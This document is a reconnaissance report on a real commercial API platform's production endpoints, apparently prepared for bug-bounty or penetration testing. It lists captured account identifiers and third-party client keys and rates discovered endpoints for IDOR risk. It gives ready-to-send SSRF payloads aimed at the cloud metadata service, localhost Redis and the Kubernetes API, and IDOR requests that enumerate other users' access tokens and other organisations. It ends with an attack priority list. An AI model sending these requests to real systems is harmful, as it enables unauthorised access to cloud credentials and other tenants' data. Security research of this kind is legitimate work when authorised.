# Kong Konnect API Traffic Analysis

## Extracted Credentials

### User Context (from LaunchDarkly)
```json
{
  "kind": "user",
  "key": "8faf728c-bef1-45c9-9ada-6285515308d2",
  "anonymous": false,
  "orgId": "8bb214f1-16e6-4465-96ac-f33334534399",
  "orgName": "test",
  "isOwner": true,
  "featureSet": "stable",
  "tier": "enterprise",
  "platformId": "cloud-02"
}
```

### Key IDs
| Type | Value |
|------|-------|
| User ID | `8faf728c-bef1-45c9-9ada-6285515308d2` |
| Org ID | `8bb214f1-16e6-4465-96ac-f33334534399` |
| Platform | `cloud-02` |
| Region | `us` |

---

## API Endpoints Discovered

### Authentication & Identity (global.api.konghq.com)

| Method | Endpoint | Purpose | IDOR Risk |
|--------|----------|---------|-----------|
| POST | `/kauth/api/v1/refresh` | Token refresh | Low |
| GET | `/v3/users/me` | Current user info | Low |
| GET | `/v3/users/{userId}/access-tokens` | **User tokens** | **HIGH** |
| GET | `/v3/organizations/me` | Current org | Low |
| GET | `/v3/organizations/{orgId}` | Specific org | **HIGH** |
| GET | `/kauth/api/v1/organizations/me/entitlements` | Entitlements | Medium |
| GET | `/v1/entitlements` | User entitlements | Low |
| GET | `/v3/users/me/permissions` | User permissions | Medium |
| GET | `/v2/identity-hash` | Intercom identity | Low |

### Billing (global.api.konghq.com)

| Method | Endpoint | Purpose | IDOR Risk |
|--------|----------|---------|-----------|
| GET | `/kbilling/v1/billing-profile/simple-redacted` | Billing info | Medium |

### Control Planes (us.api.konghq.com)

| Method | Endpoint | Purpose | IDOR Risk |
|--------|----------|---------|-----------|
| GET | `/v2/control-planes` | List control planes | **HIGH** |
| GET | `/v2/control-planes/{cpId}` | Specific CP | **HIGH** |
| GET | `/v2/control-planes/{cpId}/services` | CP services | **HIGH** |
| GET | `/v1/mesh/control-planes` | Mesh CPs | Medium |
| GET | `/kanalytics/v2/config` | Analytics config | Low |

### Cloud Gateways (global.api.konghq.com)

| Method | Endpoint | Purpose | IDOR Risk |
|--------|----------|---------|-----------|
| GET | `/v2/cloud-gateways/default-resource-quotas` | Quotas | Low |
| GET | `/v2/cloud-gateways/provider-accounts` | Provider accounts | Medium |
| GET | `/v3/cloud-gateways/configurations` | Configs | Medium |

### Notifications & Events

| Method | Endpoint | Purpose | IDOR Risk |
|--------|----------|---------|-----------|
| GET | `/v1/notifications/inbox` | User notifications | Low |
| POST | `/ui-events/api/v1/i` | UI events tracking | Low |
| GET | `/v0/onboarding/info` | Onboarding state | Low |

---

## 🚨 Potential SSRF Vector

### Datadog Proxy Endpoint
```
https://us.api.konghq.com/datadog?ddforward=<URL_ENCODED_PATH>
```

**Observed Pattern:**
```
/datadog?ddforward=%2Fapi%2Fv2%2Frum%3Fddsource%3Dbrowser...
```

**Test Payloads:**
```
/datadog?ddforward=http://169.254.169.254/latest/meta-data/
/datadog?ddforward=http://127.0.0.1:8001/
/datadog?ddforward=http://localhost:6379/
/datadog?ddforward=http://kubernetes.default.svc/
```

---

## Third-Party API Keys Exposed

| Service | Key/ID | Type |
|---------|--------|------|
| Datadog | `pub8eb5e95dbb84d86f5b47cb7dc8423b65` | Public RUM key |
| LaunchDarkly | `61b4d3465f21630d15d3ca71` | Client-side SDK key |
| Intercom | `eko2cpie` | App ID |
| Beamer | `QZwcyHaf60169` | Product ID |
| Segment | `CClmd6O2JkOVdVLV7dGMBs6F0Asio3iG` | Project ID |

**Note:** These are client-side keys, likely intended to be public. Low severity.

---

## IDOR Test Cases

### Test 1: Access Tokens IDOR
```bash
# Your tokens (should work)
GET https://global.api.konghq.com/v3/users/8faf728c-bef1-45c9-9ada-6285515308d2/access-tokens

# IDOR attempts:
GET https://global.api.konghq.com/v3/users/00000000-0000-0000-0000-000000000001/access-tokens
GET https://global.api.konghq.com/v3/users/8faf728c-bef1-45c9-9ada-6285515308d3/access-tokens
```

**Expected secure behavior:** 403 Forbidden
**Vulnerable behavior:** 200 OK with other user's tokens

### Test 2: Organization IDOR
```bash
# Your org
GET https://global.api.konghq.com/v3/organizations/8bb214f1-16e6-4465-96ac-f33334534399

# IDOR attempts:
GET https://global.api.konghq.com/v3/organizations/00000000-0000-0000-0000-000000000001
GET https://global.api.konghq.com/v3/organizations/8bb214f1-16e6-4465-96ac-f33334534398
```

### Test 3: Control Planes IDOR
```bash
# List all (check if filtered by org)
GET https://us.api.konghq.com/v2/control-planes

# Try removing org filter
GET https://us.api.konghq.com/v2/control-planes?page[size]=1000
```

---

## Attack Priorities

1. **HIGH:** `/v3/users/{userId}/access-tokens` - Direct access to API tokens
2. **HIGH:** `/v2/control-planes` - Access to gateway configurations
3. **MEDIUM:** `/datadog?ddforward=` - Potential SSRF
4. **MEDIUM:** Organization endpoints - Cross-tenant data access
5. **LOW:** Third-party API keys - Client-side, likely intentional

